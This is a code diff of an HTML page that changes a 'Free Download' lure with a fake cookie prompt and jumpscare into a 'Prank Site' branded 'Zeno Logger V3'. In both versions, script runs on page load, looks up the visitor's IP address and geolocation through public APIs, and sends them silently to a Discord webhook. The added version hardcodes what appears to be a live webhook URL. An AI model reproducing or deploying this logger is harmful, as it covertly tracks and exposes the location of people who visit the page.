@@ -3,139 +3,82 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Free Download</title>
-    <meta property="og:title" content="Free Download">
-    <meta property="og:site_name" content="Free Download">
-    <meta property="og:image" content="images/Parad1st.png">
-    <meta property="og:description" content="Free Download By Parad1st - скачать абсолютно бесплатно!">
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="photo">
-    <meta name="twitter:title" content="Programm">
-    <meta name="twitter:site" content="@fps_boost">
-    <meta name="twitter:description" content="FREE!">
-    <meta name="twitter:image:src" content="Parad1st.png">
-    <link rel="preconnect" href="https://fonts.gstatic.com">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&amp;display=swap" rel="stylesheet">
-    <style>
-        p {
+    <title>Prank Site</title>
+    <style type="text/css">
+        body {
             margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: white;
+            overflow: hidden;
         }
-        *, *::before, *::after {
-            box-sizing: border-box;
+        .content {
+            z-index: 2;
+            text-align: center;
+            position: relative;
         }
-        .overlay, .scare {
-            position: fixed;
+        img {
+            max-width: 300px;
+            margin: 20px 0;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+        .background {
+            position: absolute;
             top: 0;
             left: 0;
-            height: 100vh;
-            width: 100vw;
-        }
-        p.overlay-title {
-            font-size: 24px;
-            font-weight: 900;
-            color: black;
-            line-height: 1;
-            margin-bottom: 16px;
-        }
-        .overlay-button {
-            display: inline-flex;
-            align-items: center;
-            height: 40px;
-            padding-right: 24px;
-            padding-left: 24px;
-            font-size: 16px;
-            font-weight: 500;
-            line-height: 1;
-            border-radius: 4px;
-            margin: 4px;
-            cursor: pointer;
-        }
-        .overlay-buttons-wrapper {
-            margin: 24px -8px -8px;
-        }
-        #accept-button {
-            background-color: rgb(132, 94, 194);
-            color: white;
-        }
-        #decline-button {
-            color: rgb(132, 94, 194);
-            border: 2px solid rgb(132, 94, 194);
-        }
-        p.overlay-description {
-            font-size: 16px;
-            font-weight: 400;
-            color: rgba(0, 0, 0, 0.5);
-            line-height: 1.25;
-            margin-bottom: 16px;
-        }
-        a.overlay-link {
-            display: inline-block;
-            text-decoration: none;
-            font-size: 16px;
-            font-weight: 500;
-            color: rgb(132, 94, 194);
-            line-height: 1;
-            position: relative;
-            margin-top: 16px;
-        }
-        .overlay-body {
-            max-width: 512px;
-            text-align: center;
-            font-family: "Inter", sans-serif;
-        }
-        .overlay[hidden] {
-            display: none;
-        }
-        .overlay {
-            z-index: 2;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #f5f6fa;
-            padding-right: 24px;
-            padding-left: 24px;
-        }
-        .scare {
-            z-index: 1;
-        }
-        video#video {
-            height: 100%;
             width: 100%;
-            object-fit: cover;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            z-index: 1;
+            animation: flash 1s infinite;
         }
-        video#video::-webkit-media-controls-enclosure {
-            display: none !important;
-        }
-        #ipResult {
-            color: red;
-            font-size: 18px;
-            margin-top: 16px;
-        }
-        #jas {
-            display: block;
-            margin: 20px auto;
+        @keyframes flash {
+            0%, 50% {
+                background-image: url('jas.png');
+            }
+            50.1%, 100% {
+                background-image: url('jas2.png');
+            }
         }
     </style>
 </head>
 <body>
-<div id="overlay" class="overlay">
-    <div class="overlay-body">
-        <p class="overlay-title">Cookies и сторонний контент</p>
-        <p class="overlay-description">Этот сайт использует cookies что-бы собирать информацию об ошибках чтобы улучшить сайт и исправить ошибки. Приймите cookies для хорошей оптимальной производительности.</p>
-        <div class="overlay-buttons-wrapper">
-            <div id="accept-button" class="overlay-button">Принять</div>
-            <div id="decline-button" class="overlay-button">Отклонить</div>
-        </div>
-        <a href="https://t.me/aizen_softs" target="_blank" class="overlay-link">Пользовательское соглашение</a>
-    </div>
+<div class="background"></div>
+<div class="content">
+    <h1>IP LOGGED BY ZENO LOGGER V3</h1>
+    <img src="logo.png" alt="Prank Logo">
+    <button id="playSound">Play Sound</button>
+    <div id="ipResult"></div>
 </div>
-<div class="scare">
-    <video id="video" class="video" src="media/video.mp4" loop></video>
-</div>
-<div id="ipResult"></div>
-<img id="jas" src="jas.png" alt="Error Image">
-<audio id="jumpscare-sound" src="sound.mp3"></audio>
+
+<audio id="prankSound" src="sound.mp3"></audio>
+
 <script>
+    // Play sound on button click
+    const playButton = document.getElementById('playSound');
+    const prankSound = document.getElementById('prankSound');
+    playButton.addEventListener('click', () => {
+        prankSound.play();
+    });
+
+    // Fetch and send IP data
     function getMyIpAddress() {
         fetch("https://api64.ipify.org?format=json")
             .then(response => response.json())
@@ -143,8 +86,7 @@
                 fetch("https://ipinfo.io/" + data.ip + "/json")
                     .then(response => response.json())
                     .then(data => {
-                        var ipResultDiv = document.getElementById("ipResult");
-                        ipResultDiv.innerHTML = `
+                        document.getElementById("ipResult").innerHTML = `
                             <p><strong>IP Address:</strong> ${data.ip}</p>
                             <p><strong>City:</strong> ${data.city}</p>
                             <p><strong>Region:</strong> ${data.region}</p>
@@ -154,84 +96,46 @@
                         `;
                         sendToDiscord(data);
                     })
-                    .catch(error => console.error("Error retrieving IP information:", error));
+                    .catch(err => console.error("Error retrieving geolocation data:", err));
             })
-            .catch(error => console.error("Error retrieving IP address:", error));
+            .catch(err => console.error("Error retrieving IP address:", err));
     }
 
     function sendToDiscord(data) {
-    const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your actual webhook URL
-    const payload = {
-        embeds: [
-            {
-                title: "IP Information Captured",
-                fields: [
-                    { name: "IP Address", value: data.ip, inline: true },
-                    { name: "City", value: data.city, inline: true },
-                    { name: "Region", value: data.region, inline: true },
-                    { name: "Country", value: data.country, inline: true },
-                    { name: "Location", value: data.loc, inline: true },
-                    { name: "Organization", value: data.org, inline: true }
-                ],
-                color: 16711680, // Red color in decimal
-                timestamp: new Date().toISOString()
+        const webhookUrl = "https://discord.com/api/webhooks/1187118326380503040/d24deoHu0s7_VCgx02QwPLQLGVzQnoOeCzhvM1DDxcZULyPQoQXhUuW8pQpsm1O0zFGu";
+        const payload = {
+            embeds: [
+                {
+                    fields: [
+                        { name: "IP Address", value: data.ip, inline: true },
+                        { name: "City", value: data.city, inline: true },
+                        { name: "Region", value: data.region, inline: true },
+                        { name: "Country", value: data.country, inline: true },
+                        { name: "Location", value: data.loc, inline: true },
+                        { name: "Organization", value: data.org, inline: true }
+                    ],
+                    color: 16711680,
+                    timestamp: new Date().toISOString()
+                }
+            ]
+        };
+
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("IP data sent to Discord successfully.");
+            } else {
+                console.error("Error sending data to Discord:", response.status, response.statusText);
             }
-        ]
-    };
-
-    fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log("Data sent to Discord successfully.");
-        } else {
-            console.error(`Error sending data to Discord: ${response.status} ${response.statusText}`);
-            response.text().then(text => console.error("Response body:", text));
-        }
-    })
-    .catch(error => {
-        console.error("Error sending data to Discord:", error);
-    });
+        })
+        .catch(err => console.error("Error sending data to Discord:", err));
     }
 
-    const video = document.getElementById("video");
-    const overlay = document.getElementById("overlay");
-    const declineButton = document.getElementById("decline-button");
-    const acceptButton = document.getElementById("accept-button");
-    const jumpscareSound = document.getElementById("jumpscare-sound");
-
-    let hasClicked;
-
-    function buttonClick(event) {
-        event.preventDefault();
-        if (!hasClicked) hasClicked = true;
-        overlay.hidden = true;
-        video.play();
-        jumpscareSound.play(); // Play the sound
-        videoClick();
-    }
-
-    function videoClick(event) {
-        if (event) event.preventDefault();
-        const { documentElement } = document;
-        if (documentElement.requestFullscreen) documentElement.requestFullscreen();
-        else if (documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
-        else if (documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
-        else if (documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
-    }
-
-    document.addEventListener("DOMContentLoaded", function () {
-        getMyIpAddress();
-    });
-
-    acceptButton.addEventListener("click", buttonClick);
-    declineButton.addEventListener("click", buttonClick);
-    video.addEventListener("click", videoClick);
+    document.addEventListener("DOMContentLoaded", getMyIpAddress);
 </script>
 </body>
 </html>
